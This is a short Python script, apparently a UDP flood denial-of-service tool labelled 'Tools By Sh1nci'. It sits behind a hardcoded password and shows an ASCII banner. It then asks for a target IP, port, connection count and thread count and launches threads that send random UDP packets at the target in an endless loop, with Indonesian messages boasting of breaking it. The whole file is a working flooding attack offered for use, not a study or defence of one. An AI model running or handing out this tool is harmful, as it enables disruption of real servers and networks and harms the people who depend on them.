import random
import socket
import threading
import os
import sys

os.system("clear")
print("\033[93m")
Password = input("PASSWORD: ")

if Password=="Sh1nci X TR TEAM": 
    print(f"""
Login Successful !!
    """) 
    print('''\033[94mTools By Sh1nci
░██████╗██╗░░██╗░░███╗░░███╗░░██╗░█████╗░██╗
██╔════╝██║░░██║░████║░░████╗░██║██╔══██╗██║
╚█████╗░███████║██╔██║░░██╔██╗██║██║░░╚═╝██║
░╚═══██╗██╔══██║╚═╝██║░░██║╚████║██║░░██╗██║
██████╔╝██║░░██║███████╗██║░╚███║╚█████╔╝██║
╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝''')

    ip = str(input("ip:"))
    port = int(input("Port:"))
    times = int(input("Connections:"))
    threads = int(input("Threading:"))
    def run():
        data = random._urandom(860)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                    s.sendto(data,addr)
                print("\033[92m!! SH1NCI SEDANG MENYENGGOL SAMPAI JEBOLL!!!")
            except:
                print("\033[91m!! JEBOLL !!!")

    for y in range(threads):
            th = threading.Thread(target = run)
            th.start()

else :
    print("Login Failed Password You Entered Wrong")